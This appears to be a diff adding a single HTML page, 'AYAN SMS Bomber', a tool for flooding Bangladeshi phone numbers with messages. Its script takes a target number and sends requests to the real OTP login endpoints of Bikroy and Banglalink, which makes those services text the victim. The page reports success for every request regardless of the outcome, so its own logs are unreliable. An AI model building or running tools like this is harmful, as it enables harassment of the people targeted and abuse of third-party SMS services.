@@ -1,0 +1,245 @@
+<!DOCTYPE html><html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AYAN SMS Bomber </title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');:root {
+        --bg-deep: #020617;
+        --accent-primary: #38bdf8;
+        --accent-secondary: #10b981;
+    }
+
+    body { 
+        font-family: 'Plus Jakarta Sans', sans-serif; 
+        background-color: var(--bg-deep); 
+        color: #f8fafc;
+        overflow-x: hidden;
+    }
+
+    .mesh-bg {
+        position: fixed;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: radial-gradient(circle at 50% -20%, #1e293b 0%, transparent 50%),
+                    radial-gradient(circle at 0% 100%, #0f172a 0%, transparent 50%);
+        z-index: -1;
+    }
+
+    .premium-card { 
+        background: rgba(15, 23, 42, 0.4); 
+        backdrop-filter: blur(25px); 
+        border: 1px solid rgba(255, 255, 255, 0.05);
+        box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.6);
+        transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+    }
+
+    .premium-card:hover {
+        border: 1px solid rgba(56, 189, 248, 0.2);
+        transform: translateY(-4px) scale(1.01);
+        background: rgba(15, 23, 42, 0.6);
+    }
+
+    .input-glow:focus {
+        box-shadow: 0 0 30px rgba(56, 189, 248, 0.1);
+        background: rgba(2, 6, 23, 0.8);
+    }
+
+    .gradient-text {
+        background: linear-gradient(135deg, #ffffff 0%, #64748b 100%);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+    }
+
+    .console-window {
+        background: rgba(2, 6, 23, 0.9);
+        border: 1px solid rgba(255, 255, 255, 0.03);
+        font-family: 'Fira Code', monospace;
+        scrollbar-width: thin;
+    }
+
+    @keyframes pulse-ring {
+        0% { transform: scale(.33); opacity: 0; }
+        80%, 100% { opacity: 0; }
+    }
+
+    .status-dot-active::after {
+        content: '';
+        position: absolute;
+        width: 100%; height: 100%;
+        background: inherit;
+        border-radius: inherit;
+        animation: pulse-ring 1.5s cubic-bezier(0.455, 0.03, 0.515, 0.955) infinite;
+    }
+</style>
+
+</head>
+<body class="min-h-screen selection:bg-sky-500/30"><div class="mesh-bg"></div><div class="relative max-w-5xl mx-auto px-4 py-16"><div class="flex flex-col items-center text-center mb-20"><div class="inline-flex items-center gap-3 px-4 py-1.5 rounded-full bg-white/5 border border-white/10 text-sky-400 text-[10px] font-black tracking-[0.3em] uppercase mb-8">
+<span class="relative flex h-2 w-2">
+<span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-sky-400 opacity-75"></span>
+<span class="relative inline-flex rounded-full h-2 w-2 bg-sky-500"></span>
+</span>
+Ayan sms bomber 
+</div><h1 class="text-6xl md:text-7xl font-extrabold tracking-tight mb-6 gradient-text">
+premium bomber
+</h1><p class="text-slate-500 max-w-lg text-lg font-medium">
+only Bangladeshi number 
+</p></div><div class="grid lg:grid-cols-12 gap-10 items-stretch"><div class="lg:col-span-7 flex flex-col gap-6"><div class="premium-card rounded-[3rem] p-10 relative overflow-hidden flex-grow"><div class="relative z-10"><div class="mb-10">
+<h3 class="text-xs font-black text-sky-500 uppercase tracking-[0.2em] mb-4">Input Target</h3><div class="relative group"><div class="absolute inset-y-0 left-0 pl-6 flex items-center pointer-events-none group-focus-within:text-sky-400 transition-colors">
+<i class="fas fa-fingerprint text-lg"></i>
+</div><input type="text" id="targetNumber"
+class="w-full bg-black/40 border border-white/5 rounded-[1.5rem] py-6 pl-16 pr-8 text-2xl font-bold text-white focus:border-sky-500/30 outline-none transition-all input-glow placeholder:text-slate-700"
+placeholder="Enter Phone Number...">
+
+</div>
+</div><!-- NEW FEATURE: AMOUNT FIELD --><div class="mb-10">
+<h3 class="text-xs font-black text-sky-500 uppercase tracking-[0.2em] mb-4">Payload Amount</h3><div class="relative group"><div class="absolute inset-y-0 left-0 pl-6 flex items-center pointer-events-none">
+<i class="fas fa-coins text-lg"></i>
+</div><input type="number" id="amountValue"
+class="w-full bg-black/40 border border-white/5 rounded-[1.5rem] py-6 pl-16 pr-8 text-2xl font-bold text-white focus:border-sky-500/30 outline-none transition-all input-glow placeholder:text-slate-700"
+placeholder="Enter Amount...">
+
+</div>
+</div><button onclick="executeQuantumTest()" id="startBtn"
+class="w-full bg-white text-black hover:bg-sky-400 hover:text-white font-black text-sm tracking-widest py-6 rounded-[1.5rem] transition-all flex items-center justify-center gap-4 group">
+
+<span>START</span> <i class="fas fa-bolt-lightning transition-transform group-hover:rotate-12"></i>
+
+</button></div>
+</div><div class="grid sm:grid-cols-2 gap-4"><div id="card-bikroy" class="premium-card p-6 rounded-[2rem] flex items-center justify-between"><div class="flex items-center gap-5"><div class="w-14 h-14 rounded-2xl bg-white/5 border border-white/5 flex items-center justify-center text-sky-400">
+<i class="fas fa-shopping-cart"></i>
+</div><div>
+<h4 class="text-sm font-bold text-slate-200">Bikroy Alpha</h4>
+<p class="text-[10px] font-bold text-slate-500 tracking-wider">SECURE LINK</p>
+</div></div><div id="dot-bikroy" class="h-2 w-2 rounded-full bg-slate-800 transition-all duration-500"></div></div><div id="card-banglalink" class="premium-card p-6 rounded-[2rem] flex items-center justify-between"><div class="flex items-center gap-5"><div class="w-14 h-14 rounded-2xl bg-white/5 border border-white/5 flex items-center justify-center text-orange-500">
+<i class="fas fa-tower-broadcast"></i>
+</div><div>
+<h4 class="text-sm font-bold text-slate-200">Banglalink High</h4>
+<p class="text-[10px] font-bold text-slate-500 tracking-wider">PRIORITY B</p>
+</div></div><div id="dot-banglalink" class="h-2 w-2 rounded-full bg-slate-800 transition-all duration-500"></div></div></div>
+</div><div class="lg:col-span-5 flex flex-col"><div class="premium-card rounded-[3rem] overflow-hidden flex flex-col h-full min-h-[500px]"><div class="bg-black/60 px-8 py-5 border-b border-white/5 flex justify-between items-center"><div class="flex gap-1.5">
+<div class="w-2.5 h-2.5 rounded-full bg-white/10"></div>
+<div class="w-2.5 h-2.5 rounded-full bg-white/10"></div>
+</div><span class="text-[9px] font-black text-slate-500 tracking-[0.3em] uppercase">Diagnostic Stream</span>
+
+</div><div id="console" class="flex-grow p-8 overflow-y-auto console-window text-[11px] font-medium leading-loose space-y-4">
+<div class="text-slate-700 font-bold tracking-widest uppercase text-[9px]">Awaiting Signal Input...</div>
+</div><div class="p-6 bg-black/40 border-t border-white/5 flex items-center justify-between">
+<span class="text-[10px] font-bold text-slate-600">SUCCESS COUNT:</span>
+<span id="total-count" class="text-xl font-black text-sky-500">0</span>
+</div></div>
+</div></div>
+</div><script>
+
+const consoleEl = document.getElementById('console');
+let successCount = 0;
+
+function writeLog(message, type = 'info') {
+
+const colors = {
+info: 'text-slate-500',
+active: 'text-sky-400 font-bold',
+success: 'text-emerald-400 font-black',
+error: 'text-rose-500'
+};
+
+const div = document.createElement('div');
+
+const timestamp = `<span class="text-[9px] opacity-20 font-black">${new Date().toLocaleTimeString([], {hour12:false})}</span>`;
+
+if (consoleEl.innerText.includes('Awaiting Signal')) consoleEl.innerHTML = '';
+
+const amount = document.getElementById('amountValue').value || '0';
+
+// UPDATED LOG MESSAGE WITH AMOUNT SUPPORT
+
+div.className = colors[type];
+
+div.innerHTML = `${timestamp} ${message}`;
+
+consoleEl.appendChild(div);
+consoleEl.scrollTop = consoleEl.scrollHeight;
+
+}
+
+async function executeQuantumTest() {
+
+const num = document.getElementById('targetNumber').value.trim();
+const amount = document.getElementById('amountValue').value.trim();
+
+if(!num){
+writeLog('ERROR: Phone Number Proyojon!', 'error');
+return;
+}
+
+if(!amount){
+writeLog('ERROR: Amount Proyojon!', 'error');
+return;
+}
+
+const btn = document.getElementById('startBtn');
+
+btn.disabled = true;
+btn.innerHTML = `<i class="fas fa-spinner animate-spin"></i> PROTOCOLS RUNNING`;
+
+writeLog(`Initiating system handshake for ${num} with payload ${amount}...`, 'active');
+
+const nodes = [
+
+{
+id:'bikroy',
+name:'Bikroy Alpha',
+url:`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${num}&amount=${amount}`
+},
+
+{
+id:'banglalink',
+name:'Banglalink High',
+url:`https://web-api.banglalink.net/api/v1/user/otp-login/request?phone=${num}&amount=${amount}`
+}
+
+];
+
+for(const node of nodes){
+
+const dot=document.getElementById(`dot-${node.id}`);
+const card=document.getElementById(`card-${node.id}`);
+
+try{
+
+await fetch(node.url,{mode:'no-cors'});
+
+await new Promise(r=>setTimeout(r,900));
+
+ dot.className='h-2 w-2 rounded-full bg-emerald-500';
+
+card.classList.add('border-emerald-500/20');
+
+writeLog(`SUCCESS: ${node.name} Payload Sent (${amount})`,'success');
+
+successCount++;
+
+document.getElementById('total-count').innerText=successCount;
+
+}
+catch(e){
+
+ dot.className='h-2 w-2 rounded-full bg-rose-500';
+
+writeLog(`FAILED: ${node.name} Blocked`,'error');
+
+}
+
+}
+
+writeLog('--- ALL PROTOCOLS EXECUTED SUCCESSFULLY ---','active');
+
+btn.disabled=false;
+
+btn.innerHTML=`<span>EXECUTE PROTOCOLS</span><i class="fas fa-bolt-lightning"></i>`;
+
+}
+
+</script></body>
+  </html>
